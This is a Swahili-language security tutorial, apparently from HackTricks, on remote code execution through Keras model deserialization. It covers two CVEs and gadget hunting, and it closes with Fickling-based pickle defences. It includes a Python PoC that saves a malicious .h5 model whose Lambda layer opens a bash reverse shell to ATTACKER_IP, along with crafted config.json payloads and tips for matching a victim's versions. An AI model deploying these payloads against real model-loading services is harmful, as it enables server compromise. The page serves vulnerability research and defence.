# RCE ya Kutoa Deserialization ya Keras Model na Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unatoa muhtasari wa mbinu za practical exploitation dhidi ya pipeline ya Keras model deserialization, unaeleza internals na attack surface ya native .keras format, na unatoa researcher toolkit ya kutafuta Model File Vulnerabilities (MFVs) na post-fix gadgets.

## Internals za .keras model format

Faili la .keras ni ZIP archive linalo kati ya:<sup>[[1]](#references)</sup>
- metadata.json – taarifa za jumla (kwa mfano, Keras version)
- config.json – model architecture (primary attack surface)
- model.weights.h5 – weights katika HDF5

config.json huendesha recursive deserialization: Keras hu-import modules, hutafuta classes/functions na huunda upya layers/objects kutoka kwa dictionaries zinazodhibitiwa na attacker.<sup>[[1]](#references)</sup>

Mfano wa snippet ya Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization hufanya:<sup>[[1]](#references)</sup>
- Module import na symbol resolution kutoka kwenye keys za module/class_name
- from_config(...) au constructor invocation yenye kwargs zinazodhibitiwa na attacker
- Recursion ndani ya objects zilizopachikwa (activations, initializers, constraints, n.k.)

Kihistoria, hii ilimpa attacker primitives tatu za kutumia wakati wa kutengeneza config.json:<sup>[[1]](#references)</sup>
- Kudhibiti modules zitakazo-importiwa
- Kudhibiti classes/functions zitakazotafutwa
- Kudhibiti kwargs zinazopitishwa kwenye constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Chanzo kikuu:
- Legacy Lambda deserialization iliunda upya Python function kutoka kwenye marshaled code inayodhibitiwa na attacker: `func_load()` hufanya base64-decode ya payload, huita `marshal.loads()`, na kuunda `FunctionType`. Bytecode ya function inayotokana huendeshwa Lambda inapo-invoked, na loaders zilizoathiriwa za kabla ya 2.13 hazikutekeleza safe-mode checks kwa legacy formats.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Katika native Keras v3 archive, Lambda function huwakilishwa kama `__lambda__` object ambayo field yake ya `code` ina marshaled code iliyosimbwa kwa base64:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Mitigation:
- Keras inatekeleza `safe_mode=True` kwa default katika native Keras v3 format. Python lambdas zilizoserializewa ndani ya `Lambda` huzuiwa isipokuwa user achague wazi kutumia `safe_mode=False`; ulinzi huu hauzihusu legacy formats kwa njia ileile.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notes:
- Legacy formats (HDF5 saves za zamani) au codebases za zamani huenda zisitekeleze checks za kisasa, hivyo attacks za mtindo wa “downgrade” bado zinaweza kutumika waathiriwa wanapotumia loaders za zamani.

## CVE-2025-1550 – Uingizaji wa module kiholela katika Keras 3.0.0–3.8.x

Root cause:
- `_retrieve_class_or_fn` ilitumia `importlib.import_module(module)` kwenye module strings zinazodhibitiwa na attacker kutoka `config.json`.
- Impact: Archive ya `.keras` iliyoundwa kwa uangalifu ingeweza kusababisha `Model.load_model()` ku-import Python modules na functions zilizochaguliwa na attacker, ikiwa na side effects wakati wa import na arguments zinazodhibitiwa na attacker, hata kwa `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Maboresho ya usalama (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: imports zimezuiwa kwenye modules rasmi za ecosystem: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True huzuia upakiaji usio salama wa serialized-function za Lambda
- Basic type checking: objects zilizodeserialize lazima zilingane na aina zinazotarajiwa

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Deployments za zamani za TensorFlow-Keras huenda bado zikakubali model files za HDF5 (`.h5`). Ikiwa attacker anaweza kupakia model ambayo server baadaye hu-load au kutumia kufanya inference, loader iliyoathirika inaweza kudeserialize Lambda layer iliyo na Python inayodhibitiwa na attacker, ambayo inaweza kutekelezwa ndani ya model workflow ya application.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Minimal PoC ya kuunda malicious .h5 ambayo Lambda yake hutekeleza reverse shell target inapo-invoke model:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Vidokezo na mbinu za kuaminika:
- Sehemu za kuanzisha hutofautiana kulingana na format na workflow; write-up iliyorejelewa ilibaini payload ikitekelezwa mara mbili wakati wa prediction. Chukulia side effects kama zinazoweza kujirudia na ufanye payloads ziwe idempotent.<sup>[[7]](#references)</sup>
- Version pinning: linganisha TF/Keras/Python za victim ili kuepuka kutolingana kwa serialization. Kwa mfano, tengeneza artifacts chini ya Python 3.8 yenye TensorFlow 2.13.1 ikiwa hiyo ndiyo inatumiwa na target.<sup>[[7]](#references)</sup>
- Uigaji wa haraka wa mazingira:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validation: payload isiyo na madhara kama `os.system("ping -c 1 YOUR_IP")` husaidia kuthibitisha execution (kwa mfano, kuona ICMP kwa kutumia tcpdump) kabla ya kubadili hadi reverse shell.<sup>[[7]](#references)</sup>

## Gadget surface baada ya fix ndani ya allowlist

Hata kwa Keras module allowlist na safe mode, callables zinazoruhusiwa zinaweza kufichua side effects. Kwa mfano, `keras.utils.get_file` hupakua URL na kuiandika chini ya cache location iliyosanidiwa, hivyo kuwa candidate kwa gadget analysis.<sup>[[1]](#references)[[19]](#references)</sup>

Candidate Lambda configuration (validate call signature katika controlled test):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Kikomo muhimu:
- `Lambda.call()` kila mara hupitisha model input kama positional argument ya kwanza na `arguments` zilizosanidiwa kama keyword arguments. Kwa `get_file`, thamani hiyo ya positional hujaza `fname`; kutolingana kwa tensor/path kunaweza kufanya candidate hii ishindwe kabla ya download yoyote, kwa hivyo si gadget inayofanya kazi kwa uhakika.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML pickle import allowlisting for AI/ML models (Fickling)

Miundo mingi ya AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn artifacts, na miundo mingine ya Python-native) hujumuisha data ya Python pickle. Legacy Keras Lambda path iliyo hapo juu hutumia marshaled function bytecode badala yake, kwa hivyo ni deserialization risk tofauti. Pickle opcodes zinaweza kuendesha tabia inayodhibitiwa na attacker wakati wa deserialization, ikiwemo model tampering au RCE, na scanners rahisi zinaweza kukosa imports mpya au hatari ambazo hazijaorodheshwa.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Ulinzi wa vitendo wa fail-closed ni ku-hook pickle deserializer ya Python na kuruhusu tu seti iliyokaguliwa ya imports zisizo na madhara zinazohusiana na ML wakati wa unpickling. Fickling ya Trail of Bits hutekeleza policy hii na huja na curated ML import allowlist iliyoundwa kutokana na maelfu ya public Hugging Face pickles.<sup>[[8]](#references)[[13]](#references)</sup>

Security model ya imports “salama” (uelewa uliotolewa kutoka kwa research na practice): symbols zilizo-import na zinazotumiwa na pickle lazima wakati mmoja:<sup>[[8]](#references)</sup>
- Zisiweze kuendesha code au kusababisha execution (bila compiled/source code objects, shelling out, hooks, n.k.)
- Zisiweze kupata/kubadilisha attributes au items kiholela
- Zisiweze ku-import au kupata references za Python objects nyingine kutoka kwa pickle VM
- Zisiweze ku-trigger secondary deserializers (k.m. marshal, nested pickle), hata kwa njia isiyo ya moja kwa moja

Washa protections za Fickling mapema iwezekanavyo wakati wa process startup ili pickle loads zozote zinazofanywa na frameworks (`torch.load`, `joblib.load`, n.k.) zikaguliwe:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Vidokezo vya uendeshaji:
- Unaweza kuzima/kuwezesha tena hooks kwa muda inapohitajika:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Ikiwa model inayojulikana kuwa salama imezuiwa, panua allowlist ya mazingira yako baada ya kukagua symbols:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling pia hutoa generic runtime guards ikiwa unapendelea udhibiti wa kina zaidi:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() ili kulazimisha ukaguzi kwa pickle.load() zote
- with fickling.check_safety(): kwa enforcement yenye scope maalum
- fickling.load(path) / fickling.is_likely_safe(path) kwa ukaguzi wa mara moja

- Pendelea model formats zisizo za pickle inapowezekana (kwa mfano, SafeTensors).<sup>[[15]](#references)</sup> Ikiwa lazima ukubali pickle, endesha loaders kwa least privilege bila network egress na enforce allowlist.

Mkakati huu wa allowlist-first unaonyesha kwa vitendo kuwa unazuia common ML pickle exploit paths huku ukihifadhi compatibility ya juu. Katika benchmark ya ToB, Fickling ilitambua 100% ya synthetic malicious files na ikaruhusu takriban 99% ya clean files kutoka top Hugging Face repos.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) Ugunduzi wa kimfumo wa gadgets katika modules zinazoruhusiwa

Enumerate candidate callables katika keras, keras_nlp, keras_cv, keras_hub na prioritize zile zenye file/network/process/env side effects.<sup>[[1]](#references)</sup>

<details>
<summary>Enumerate potentially dangerous callables in allowlisted Keras modules</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Upimaji wa direct deserialization (hakuna .keras archive inayohitajika)

Wasilisha dicts zilizoundwa mahususi moja kwa moja kwa Keras deserializers ili kujifunza params zinazokubalika na kuchunguza side effects.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Uchunguzi wa matoleo mbalimbali na formats

Keras ipo katika codebases/eras nyingi zenye guardrails na formats tofauti:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, imepangwa kufutwa)
- tf-keras: inaendelezwa kando
- Multi-backend Keras 3 (official): ilianzisha native .keras

Rudia majaribio katika codebases na formats mbalimbali (.keras dhidi ya legacy HDF5) ili kugundua regressions au guard ambazo hazipo.

## References

- [1] [Kuchunguza Vulnerabilities katika Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Iliongeza checks kwenye serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers Allow Arbitrary Code Injection](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
